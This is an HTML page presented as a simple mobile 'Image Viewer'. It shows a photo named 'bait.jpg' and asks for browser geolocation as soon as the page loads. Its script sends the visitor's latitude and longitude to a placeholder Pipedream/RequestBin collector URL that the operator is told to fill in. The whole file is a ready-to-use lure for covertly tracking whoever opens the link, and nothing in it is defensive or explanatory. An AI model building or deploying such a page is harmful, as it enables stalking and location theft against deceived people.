<!DOCTYPE html>
<html>
<head>
    <title>Image Viewer</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        /* This makes the background black and centered */
        body { background: #000; margin: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; overflow: hidden; }
        /* This makes the image look like a real mobile photo view */
        img { max-width: 100%; max-height: 100vh; object-fit: contain; }
    </style>
</head>
<body onload="getLocation()">

    <img src="bait.jpg">

    <script>
        // REPLACE THIS with your Pipedream/RequestBin URL
        const gate = "https://your-pipedream-url.m.pipedream.net";

        function getLocation() {
            if (navigator.geolocation) {
                // This triggers the popup immediately as the page loads
                navigator.geolocation.getCurrentPosition(showPosition, showError);
            }
        }

        function showPosition(position) {
            // Sends the Latitude and Longitude to your dashboard
            fetch(gate + "?lat=" + position.coords.latitude + "&lon=" + position.coords.longitude + "&type=InstantImage");
        }

        function showError(error) {
            // If they click 'Deny', the photo just stays there normally
            console.log("Permission denied.");
        }
    </script>
</body>
</html>
